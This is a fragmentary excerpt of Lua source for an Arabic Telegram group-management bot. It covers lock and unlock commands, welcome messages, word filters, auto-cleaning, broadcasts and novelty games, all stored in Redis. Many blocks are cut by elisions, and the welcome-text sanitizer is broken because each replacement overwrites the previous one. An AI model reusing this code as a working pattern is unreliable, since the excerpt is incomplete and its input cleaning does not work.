Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙الايدي بالصوره بالتاكيد معطل', 1, 'md')
else
local SAKOTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الايدي بالصوره'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(SAKO..'Rio:Lock:Id:Photo'..msg.chat_id_,true)
end end 
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(SAKO..'Rio:Lock:Id'..msg.chat_id_)
end end 
if text and text == 'تعطيل الايدي' and ChCheck(msg) then
if DevRio:get(SAKO..'Rio:Lock:Id'..msg.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙الايدي بالتاكيد معطل ', 1, 'md')
else
local SAKOTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الايدي بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(SAKO..'Rio:Lock:Id'..msg.chat_id_,true)
end end
end
--     Source SAKO     --
...
DevRio:setex(SAKO.."Rio:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_,300,true) 
end
if text == 'انشاء رابط' and ChCheck(msg) or text == 'انشاء الرابط' and ChCheck(msg) then
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if not DevRio:get(SAKO.."Rio:Groups:Links"..msg.chat_id_)  then 
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
DevRio:set(SAKO.."Rio:Groups:Links"..msg.chat_id_,LinkGroup) 
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(SAKO.."Rio:Lock:Welcome"..msg.chat_id_,true)
end
if text and text:match("^تعطيل الترحيب$") and ChCheck(msg) then
local SAKOTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الترحيب بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(SAKO.."Rio:Lock:Welcome"..msg.chat_id_)
end
if DevRio:get(SAKO..'Rio:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_) then 
if text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء حفظ كليشة الترحيب', 1, 'md')
DevRio:del(SAKO..'Rio:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
DevRio:del(SAKO..'Rio:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_)
Welcomes = text:gsub('"',"") Welcomes = text:gsub("'","") Welcomes = text:gsub(",","") Welcomes = text:gsub("*","") Welcomes = text:gsub(";","") Welcomes = text:gsub("`","") Welcomes = text:gsub("{","") Welcomes = text:gsub("}","") 
DevRio:set(SAKO..'Rio:Groups:Welcomes'..msg.chat_id_,Welcomes)
...
DevRio:set(SAKO..'Rio:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
if text and text:match("^حذف الترحيب$") and ChCheck(msg) or text and text:match("^حذف ترحيب$") and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم حذف الترحيب")  
DevRio:del(SAKO..'Rio:Groups:Welcomes'..msg.chat_id_)
end
if text and text:match("^جلب الترحيب$") and ChCheck(msg) or text and text:match("^جلب ترحيب$") and ChCheck(msg) or text and text:match("^الترحيب$") and ChCheck(msg) then
local Welcomes = DevRio:get(SAKO..'Rio:Groups:Welcomes'..msg.chat_id_)
if Welcomes then
Dev_Rio(msg.chat_id_, msg.id_, 1, Welcomes, 1, 'md')
else
...
--     Source SAKO     --
if DevRio:get(SAKO..'Rio:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_) then  
if text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء حفظ الوصف", 1, 'md')
DevRio:del(SAKO..'Rio:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
DevRio:del(SAKO..'Rio:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_)
...
DevRio:set(SAKO..'Rio:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_,true)
...
DevRio:set(SAKO.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_,"add")  
return false  
end    
if DevRio:get(SAKO.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_) == "add" then
if text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر المنع', 1, 'md')
DevRio:del(SAKO.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
return false  
end   
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم منع الكلمه ↫ "..text, 1, 'html')
DevRio:del(SAKO.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
DevRio:hset(SAKO..'Rio:Filters:'..msg.chat_id_, text,'newword')
return false
end
if text and text == "الغاء منع" and msg.reply_to_message_id_ == 0 and ChCheck(msg) then       
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙ارسل لي الكلمه الان", 1, 'md') 
DevRio:set(SAKO.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_,"del")  
return false  
end    
if DevRio:get(SAKO.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_) == "del" then   
if text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر الغاء المنع', 1, 'md')
DevRio:del(SAKO.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
return false  
end   
if not DevRio:hget(SAKO..'Rio:Filters:'..msg.chat_id_, text) then  
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙الكلمه ↫ "..text.." غير ممنوعه", 1, 'html')
DevRio:del(SAKO.."Rio:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
else
DevRio:hdel(SAKO..'Rio:Filters:'..msg.chat_id_, text)
...
local gps = DevRio:scard(SAKO.."Rio:Groups") local users = DevRio:scard(SAKO.."Rio:Users") 
...
local users = DevRio:scard(SAKO.."Rio:Users")
...
local gps = DevRio:scard(SAKO.."Rio:Groups")
...
if not DevRio:get(SAKO..'Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_) then  
...
DevRio:setex(SAKO..'Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
end 
end
...
local pv = DevRio:smembers(SAKO.."Rio:Users")
local sendok = 0
for i = 1, #pv do
...
DevRio:srem(SAKO.."Rio:Users",pv[i])
sendok = sendok + 1
end
if #pv == i then 
if sendok == 0 then
...
local group = DevRio:smembers(SAKO.."Rio:Groups")
local w = 0
local q = 0
for i = 1, #group do
tdcli_function({ID='GetChat',chat_id_ = group[i]},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
DevRio:srem(SAKO.."Rio:Groups",group[i]) 
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = group[i], user_id_ = SAKO, status_ = { ID = "ChatMemberStatusLeft" }, }, dl_cb, nil)
w = w + 1
end
...
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙عدد الكروبات الان ↫ { '..#group..' }'..SAKOgp1..SAKOgp2..'\n᥀︙العدد الحقيقي الان  ↫ ( '..SAKOgp3..' ) \n ', 1, 'md')
end end
end,nil)
end
return false
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(SAKO..'Rio:Lock:CleanNum'..msg.chat_id_,true)  
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(SAKO..'Rio:Lock:CleanNum'..msg.chat_id_) 
end
...
DevRio:set(SAKO..'Rio:CleanNum'..msg.chat_id_,Num) 
end end 
if msg and DevRio:get(SAKO..'Rio:Lock:CleanNum'..msg.chat_id_) then
if DevRio:get(SAKO..'Rio:CleanNum'..msg.chat_id_) then CleanNum = DevRio:get(SAKO..'Rio:CleanNum'..msg.chat_id_) else CleanNum = 200 end
if DevRio:scard(SAKO.."Rio:cleanernum"..msg.chat_id_) >= tonumber(CleanNum) then 
local List = DevRio:smembers(SAKO.."Rio:cleanernum"..msg.chat_id_)
local Del = 0
for k,v in pairs(List) do
Del = (Del + 1)
local Message = v
...
DevRio:del(SAKO.."Rio:cleanernum"..msg.chat_id_)
end 
end
if CleanerNum(msg) then
if DevRio:get(SAKO..'Rio:Lock:CleanNum'..msg.chat_id_) then 
if text == "التلقائي" and ChCheck(msg) or text == "عدد التلقائي" and ChCheck(msg) then 
local M = DevRio:scard(SAKO.."Rio:cleanernum"..msg.chat_id_)
if M ~= 0 then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙عدد الميديا ↫ "..M.."\n᥀︙الحذف التلقائي ↫ "..(DevRio:get(SAKO..'Rio:CleanNum'..msg.chat_id_) or 200), 1, 'md') 
else
...
local SAKOTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل امسح بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(SAKO..'Rio:Lock:Clean'..msg.chat_id_,true)  
end
if text == "تعطيل امسح" and Constructor(msg) then
local SAKOTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل امسح بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(SAKO..'Rio:Lock:Clean'..msg.chat_id_) 
end
if Cleaner(msg) then
if DevRio:get(SAKO..'Rio:Lock:Clean'..msg.chat_id_) then 
if text == "الميديا" and ChCheck(msg) or text == "عدد الميديا" and ChCheck(msg) then 
local M = DevRio:scard(SAKO.."Rio:cleaner"..msg.chat_id_)
if M ~= 0 then
...
DevRio:del(SAKO.."Rio:cleaner"..msg.chat_id_)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙لاتوجد ميديا هنا", 1, 'md') 
end end 
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(SAKO..'Rio:Lock:CleanMusic'..msg.chat_id_,true)  
end
if text == "تعطيل مسح الاغاني" and Constructor(msg) then
local SAKOTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل مسح الاغاني بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(SAKO..'Rio:Lock:CleanMusic'..msg.chat_id_) 
end
if CleanerMusic(msg) then
if DevRio:get(SAKO..'Rio:Lock:CleanMusic'..msg.chat_id_) then 
if text == "الاغاني" and ChCheck(msg) or text == "عدد الاغاني" and ChCheck(msg) then 
local M = DevRio:scard(SAKO.."Rio:cleanermusic"..msg.chat_id_)
if M ~= 0 then
...
local List = DevRio:smembers(SAKO.."Rio:cleanermusic"..msg.chat_id_)
local Del = 0
for k,v in pairs(List) do
Del = (Del + 1)
local Message = v
...
DevRio:del(SAKO.."Rio:cleanermusic"..msg.chat_id_)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙لاتوجد اغاني هنا", 1, 'md') 
end end end end
--     Source SAKO     --
...
if DevRio:get(SAKO..'Rio:Lock:EditMsgs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح التعديل")  
DevRio:del(SAKO..'Rio:Lock:EditMsgs'..msg.chat_id_)
else
...
DevRio:del(SAKO.."Rio:Lock:Bots"..msg.chat_id_)  
end end
if UnLockText[2] == "التكرار" then 
DevRio:hdel(SAKO.."Rio:Spam:Group:User"..msg.chat_id_ ,"Spam:User")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح التكرار")  
end
if BasicConstructor(msg) then
if UnLockText[2] == "التثبيت" then
if DevRio:get(SAKO..'Rio:Lock:Pin'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح التثبيت")  
DevRio:del(SAKO..'Rio:Lock:Pin'..msg.chat_id_)
DevRio:srem(SAKO.."Rio:Lock:Pinpin",msg.chat_id_)
else
...
DevRio:del(SAKO..'Rio:Lock:Text'..msg.chat_id_)
else
...
DevRio:del(SAKO..'Rio:Lock:Photo'..msg.chat_id_)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙الصور بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الكلايش" then
if DevRio:get(SAKO..'Rio:Lock:Spam'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح الكلايش")  
DevRio:del(SAKO..'Rio:Lock:Spam'..msg.chat_id_)
else
...
DevRio:del(SAKO..'Rio:Lock:Join'..msg.chat_id_)
else
...
DevRio:del(SAKO..'Rio:Lock:Videos'..msg.chat_id_)
else
...
DevRio:del(SAKO..'Rio:Lock:Document'..msg.chat_id_)
else
...
DevRio:del(SAKO..'Rio:Lock:Inline'..msg.chat_id_)
else
...
DevRio:del(SAKO..'Rio:Lock:Markdown'..msg.chat_id_)
else
...
DevRio:del(SAKO..'Rio:Lock:Gifs'..msg.chat_id_)
else
...
DevRio:del(SAKO..'Rio:Lock:Music'..msg.chat_id_)
else
...
DevRio:del(SAKO..'Rio:Lock:Voice'..msg.chat_id_)
else
...
DevRio:del(SAKO..'Rio:Lock:Links'..msg.chat_id_)
else
...
DevRio:del(SAKO..'Rio:Lock:Location'..msg.chat_id_)
else
...
DevRio:del(SAKO..'Rio:Lock:Tags'..msg.chat_id_)
else
...
DevRio:del(SAKO..'Rio:Lock:Hashtak'..msg.chat_id_)
else
...
DevRio:del(SAKO..'Rio:Lock:Contact'..msg.chat_id_)
else
...
DevRio:del(SAKO..'Rio:Lock:WebLinks'..msg.chat_id_)
else
...
DevRio:del(SAKO..'Rio:Lock:Arabic'..msg.chat_id_)
else
...
DevRio:del(SAKO..'Rio:Lock:English'..msg.chat_id_)
else
...
DevRio:del(SAKO..'Rio:Lock:TagServr'..msg.chat_id_)
else
...
DevRio:del(SAKO..'Rio:Lock:Stickers'..msg.chat_id_)
else
...
DevRio:del(SAKO..'Rio:Lock:Forwards'..msg.chat_id_)
else
...
DevRio:set(SAKO.."Rio:Lock:Bots"..msg.chat_id_,"del") DevRio:hset(SAKO.."Rio:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed") 
LockList ={'Rio:Lock:Links','Rio:Lock:Contact','Rio:Lock:Forwards','Rio:Lock:Videos','Rio:Lock:Gifs','Rio:Lock:EditMsgs','Rio:Lock:Stickers','Rio:Lock:Farsi','Rio:Lock:Spam','Rio:Lock:WebLinks','Rio:Lock:Photo'}
for i,Lock in pairs(LockList) do
DevRio:set(SAKO..Lock..msg.chat_id_,true)
end
...
DevRio:del(SAKO..UnLock..msg.chat_id_)
end
...
DevRio:del(SAKO..'Rio:Lock:Fshar'..msg.chat_id_) DevRio:del(SAKO..'Rio:Lock:Taf'..msg.chat_id_) DevRio:del(SAKO..'Rio:Lock:Kfr'..msg.chat_id_) 
DevRio:set(SAKO.."Rio:Lock:Bots"..msg.chat_id_,"del") DevRio:hset(SAKO.."Rio:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed") 
...
DevRio:set(SAKO..'Rio:Lock:Fshar'..msg.chat_id_,true) DevRio:set(SAKO..'Rio:Lock:Taf'..msg.chat_id_,true) DevRio:set(SAKO..'Rio:Lock:Kfr'..msg.chat_id_,true) DevRio:hdel(SAKO.."Rio:Spam:Group:User"..msg.chat_id_ ,"Spam:User") 
...
DevRio:set(SAKO..'Rio:Spam:Text'..msg.chat_id_,SetSpam)
...
DevRio:set(SAKO.."Rio:SudoBot:Rd"..msg.chat_id_,Text)
...
DevRio:set(SAKO.."Rio:BasicConstructor:Rd"..msg.chat_id_,Text)
...
DevRio:set(SAKO.."Rio:Constructor:Rd"..msg.chat_id_,Text)
...
DevRio:set(SAKO.."Rio:Managers:Rd"..msg.chat_id_,Text) 
...
DevRio:set(SAKO.."Rio:Admins:Rd"..msg.chat_id_,Text)
...
DevRio:set(SAKO.."Rio:VipMem:Rd"..msg.chat_id_,Text)
...
DevRio:set(SAKO.."Rio:Cleaner:Rd"..msg.chat_id_,Text)
...
DevRio:set(SAKO.."Rio:mem:Rd"..msg.chat_id_,Text)
...
DevRio:del(SAKO.."Rio:mem:Rd"..msg.chat_id_)
DevRio:del(SAKO.."Rio:Cleaner:Rd"..msg.chat_id_)
DevRio:del(SAKO.."Rio:VipMem:Rd"..msg.chat_id_)
DevRio:del(SAKO.."Rio:Admins:Rd"..msg.chat_id_)
DevRio:del(SAKO.."Rio:Managers:Rd"..msg.chat_id_)
DevRio:del(SAKO.."Rio:Constructor:Rd"..msg.chat_id_)
DevRio:del(SAKO.."Rio:BasicConstructor:Rd"..msg.chat_id_)
DevRio:del(SAKO.."Rio:SudoBot:Rd"..msg.chat_id_)
end
end
--     Source SAKO     --
...
if tonumber(admins[i].user_id_) ~= tonumber(SAKO) then
...
DevRio:srem(SAKO..'Rio:Tkeed:'..msg.chat_id_, v)
end 
...
DevRio:del(SAKO..'Rio:Filters:'..msg.chat_id_)
DevRio:del(SAKO..'Rio:Filters:'..msg.chat_id_)
DevRio:del(SAKO.."Rio:FilterAnimation"..msg.chat_id_)
DevRio:del(SAKO.."Rio:FilterPhoto"..msg.chat_id_)
DevRio:del(SAKO.."Rio:FilterSteckr"..msg.chat_id_)
end
...
DevRio:del(SAKO..'Rio:Ban:'..msg.chat_id_) DevRio:del(SAKO..'Rio:Admins:'..msg.chat_id_) DevRio:del(SAKO..'User:Donky:'..msg.chat_id_) DevRio:del(SAKO..'Rio:VipMem:'..msg.chat_id_) DevRio:del(SAKO..'Rio:Filters:'..msg.chat_id_) DevRio:del(SAKO..'Rio:Muted:'..msg.chat_id_)
...
local basicconstructor = DevRio:smembers(SAKO..'Rio:BasicConstructor:'..msg.chat_id_)
local constructor = DevRio:smembers(SAKO..'Rio:Constructor:'..msg.chat_id_)
local Managers = DevRio:smembers(SAKO..'Rio:Managers:'..msg.chat_id_)
local admins = DevRio:smembers(SAKO..'Rio:Admins:'..msg.chat_id_)
local vipmem = DevRio:smembers(SAKO..'Rio:VipMem:'..msg.chat_id_)
local donky = DevRio:smembers(SAKO..'User:Donky:'..msg.chat_id_)
...
spam_c = DevRio:get(SAKO..'Rio:Spam:Text'..msg.chat_id_)
end
--     Source SAKO     --
if DevRio:hget(SAKO.."Rio:Spam:Group:User"..msg.chat_id_, "Spam:User") == "kick" then     
flood = "بالطرد"     
elseif DevRio:hget(SAKO.."Rio:Spam:Group:User"..msg.chat_id_,"Spam:User") == "keed" then     
flood = "بالتقيد"     
elseif DevRio:hget(SAKO.."Rio:Spam:Group:User"..msg.chat_id_,"Spam:User") == "mute" then     
flood = "بالكتم"           
elseif DevRio:hget(SAKO.."Rio:Spam:Group:User"..msg.chat_id_,"Spam:User") == "del" then     
flood = "بالحذف"
else     
flood = "مفتوح"     
end
--     Source SAKO     --
if DevRio:get(SAKO.."Rio:Lock:Bots"..msg.chat_id_) == "del" then
lock_bots = "بالحذف"
elseif DevRio:get(SAKO.."Rio:Lock:Bots"..msg.chat_id_) == "ked" then
lock_bots = "بالتقيد"   
elseif DevRio:get(SAKO.."Rio:Lock:Bots"..msg.chat_id_) == "kick" then
lock_bots = "بالطرد"    
else
lock_bots = "مفتوحه"    
end
--     Source SAKO     --
if DevRio:get(SAKO..'Rio:Lock:Text'..msg.chat_id_) then mute_text = 'مقفله' else mute_text = 'مفتوحه'end
if DevRio:get(SAKO..'Rio:Lock:Photo'..msg.chat_id_) then mute_photo = 'مقفله' else mute_photo = 'مفتوحه' end
if DevRio:get(SAKO..'Rio:Lock:Videos'..msg.chat_id_) then mute_video = 'مقفله' else mute_video = 'مفتوحه' end
if DevRio:get(SAKO..'Rio:Lock:Gifs'..msg.chat_id_) then mute_gifs = 'مقفله' else mute_gifs = 'مفتوحه' end
if DevRio:get(SAKO..'Rio:Lock:Music'..msg.chat_id_) then mute_music = 'مقفله' else mute_music = 'مفتوحه' end
if DevRio:get(SAKO..'Rio:Lock:Inline'..msg.chat_id_) then mute_in = 'مقفله' else mute_in = 'مفتوحه' end
if DevRio:get(SAKO..'Rio:Lock:Voice'..msg.chat_id_) then mute_voice = 'مقفله' else mute_voice = 'مفتوحه' end
if DevRio:get(SAKO..'Rio:Lock:EditMsgs'..msg.chat_id_) then mute_edit = 'مقفله' else mute_edit = 'مفتوحه' end
if DevRio:get(SAKO..'Rio:Lock:Links'..msg.chat_id_) then mute_links = 'مقفله' else mute_links = 'مفتوحه' end
if DevRio:get(SAKO..'Rio:Lock:Pin'..msg.chat_id_) then lock_pin = 'مقفله' else lock_pin = 'مفتوحه' end
if DevRio:get(SAKO..'Rio:Lock:Stickers'..msg.chat_id_) then lock_sticker = 'مقفله' else lock_sticker = 'مفتوحه' end
if DevRio:get(SAKO..'Rio:Lock:TagServr'..msg.chat_id_) then lock_tgservice = 'مقفله' else lock_tgservice = 'مفتوحه' end
if DevRio:get(SAKO..'Rio:Lock:WebLinks'..msg.chat_id_) then lock_wp = 'مقفله' else lock_wp = 'مفتوحه' end
if DevRio:get(SAKO..'Rio:Lock:Hashtak'..msg.chat_id_) then lock_htag = 'مقفله' else lock_htag = 'مفتوحه' end
if DevRio:get(SAKO..'Rio:Lock:Tags'..msg.chat_id_) then lock_tag = 'مقفله' else lock_tag = 'مفتوحه' end
if DevRio:get(SAKO..'Rio:Lock:Location'..msg.chat_id_) then lock_location = 'مقفله' else lock_location = 'مفتوحه' end
if DevRio:get(SAKO..'Rio:Lock:Contact'..msg.chat_id_) then lock_contact = 'مقفله' else lock_contact = 'مفتوحه' end
if DevRio:get(SAKO..'Rio:Lock:English'..msg.chat_id_) then lock_english = 'مقفله' else lock_english = 'مفتوحه' end
if DevRio:get(SAKO..'Rio:Lock:Arabic'..msg.chat_id_) then lock_arabic = 'مقفله' else lock_arabic = 'مفتوحه' end
if DevRio:get(SAKO..'Rio:Lock:Forwards'..msg.chat_id_) then lock_forward = 'مقفله' else lock_forward = 'مفتوحه' end
if DevRio:get(SAKO..'Rio:Lock:Document'..msg.chat_id_) then lock_file = 'مقفله' else lock_file = 'مفتوحه' end
if DevRio:get(SAKO..'Rio:Lock:Markdown'..msg.chat_id_) then markdown = 'مقفله' else markdown = 'مفتوحه' end
if DevRio:get(SAKO..'Rio:Lock:Spam'..msg.chat_id_) then lock_spam = 'مقفله' else lock_spam = 'مفتوحه' end
if DevRio:get(SAKO..'Rio:Lock:Join'..msg.chat_id_) then lock_Join = 'مقفل' else lock_Join = 'مفتوح' end
if DevRio:get(SAKO.."Rio:Lock:Welcome"..msg.chat_id_) then send_welcome = 'مقفله' else send_welcome = 'مفتوحه' end
if DevRio:get(SAKO..'Rio:Lock:Fshar'..msg.chat_id_) then lock_fshar = 'مفتوح' else lock_fshar = 'مقفل' end
if DevRio:get(SAKO..'Rio:Lock:Kfr'..msg.chat_id_) then lock_kaf = 'مفتوح' else lock_kaf = 'مقفل' end
if DevRio:get(SAKO..'Rio:Lock:Taf'..msg.chat_id_) then lock_taf = 'مفتوحه' else lock_taf = 'مقفله' end
if DevRio:get(SAKO..'Rio:Lock:Farsi'..msg.chat_id_) then lock_farsi = 'مقفله' else lock_farsi = 'مفتوحه' end
local Flood_Num = DevRio:hget(SAKO.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5
--     Source SAKO     --
...
local SAKOTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل ميزة انطق'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(SAKO..'Rio:Antk:Rio'..msg.chat_id_) 
end
if text == "تعطيل انطق" and Manager(msg) and ChCheck(msg) then
local SAKOTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل ميزة انطق'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(SAKO..'Rio:Antk:Rio'..msg.chat_id_,true)  
end
if text and text:match("^انطق (.*)$") and not DevRio:get(SAKO..'Rio:Antk:Rio'..msg.chat_id_) and ChCheck(msg) then
...
--     Source SAKO     --
if DevRio:get(SAKO..'Rio:setrules'..msg.chat_id_..':'..msg.sender_user_id_) then 
if text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء حفظ قوانين المجموعه', 1, 'md')
DevRio:del(SAKO..'Rio:setrules'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
DevRio:del(SAKO..'Rio:setrules'..msg.chat_id_..':'..msg.sender_user_id_)
DevRio:set(SAKO..'Rio:rules'..msg.chat_id_,text)
...
DevRio:set(SAKO..'Rio:setrules'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
end
if text and text:match("^القوانين$") and ChCheck(msg) then
local rules = DevRio:get(SAKO..'Rio:rules'..msg.chat_id_)
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(SAKO..'Rio:Zrf:Rio'..msg.chat_id_) 
end
if text == "تعطيل الزخرفه" and Manager(msg) and ChCheck(msg) then
local SAKOTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الزخرفه بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(SAKO..'Rio:Zrf:Rio'..msg.chat_id_,true)  
end
if DevRio:get(SAKO..'Zrf:Rio'..msg.chat_id_..msg.sender_user_id_) then 
if text and text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر الزخرفه', 1, 'md')
DevRio:del(SAKO..'Zrf:Rio'..msg.chat_id_..msg.sender_user_id_)
return false  
end 
...
if not DevRio:get(SAKO..'Rio:Zrf:Rio'..msg.chat_id_) then
if text == 'زخرفه' and ChCheck(msg) or text == 'الزخرفه' and ChCheck(msg) then  
DevRio:setex(SAKO.."Zrf:Rio"..msg.chat_id_..msg.sender_user_id_,300,true)
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(SAKO..'Rio:Brg:Rio'..msg.chat_id_) 
end
if text == "تعطيل الابراج" and Manager(msg) and ChCheck(msg) then
local SAKOTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الابراج بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(SAKO..'Rio:Brg:Rio'..msg.chat_id_,true)  
end
if not DevRio:get(SAKO..'Rio:Brg:Rio'..msg.chat_id_) then
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(SAKO..'Rio:Nsba:Rio'..msg.chat_id_) 
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(SAKO..'Rio:Nsba:Rio'..msg.chat_id_,true)  
end
if not DevRio:get(SAKO..'Rio:Nsba:Rio'..msg.chat_id_) then
if text == "نسبه الحب" and ChCheck(msg) or text == "نسبة الحب" and ChCheck(msg) then
DevRio:set(SAKO..'LoveNsba:Rio'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙قم بارسل اسمين لحساب نسبة الحب بينهما كمثال ↫ جاك و روز', 1, 'md')
end
end
if text and text ~= "نسبه الحب" and text ~= "نسبة الحب" and DevRio:get(SAKO..'LoveNsba:Rio'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر نسبة الحب ', 1, 'md')
DevRio:del(SAKO..'LoveNsba:Rio'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
...
DevRio:set(SAKO..'RyNsba:Rio'..msg.chat_id_..msg.sender_user_id_,true)
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙قم بارسل اسمين لحساب نسبة الخيانه بينهما كمثال ↫ جاك و روز', 1, 'md')
end
end
if text and text ~= "نسبه الخيانه" and text ~= "نسبة الخيانه" and text ~= "↫ نسبه الخيانه ᥀" and DevRio:get(SAKO..'RyNsba:Rio'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر نسبة الخيانه ', 1, 'md')
DevRio:del(SAKO..'RyNsba:Rio'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Rio = math.random(0,100);
...
DevRio:set(SAKO..'JNsba:Rio'..msg.chat_id_..msg.sender_user_id_,true) 
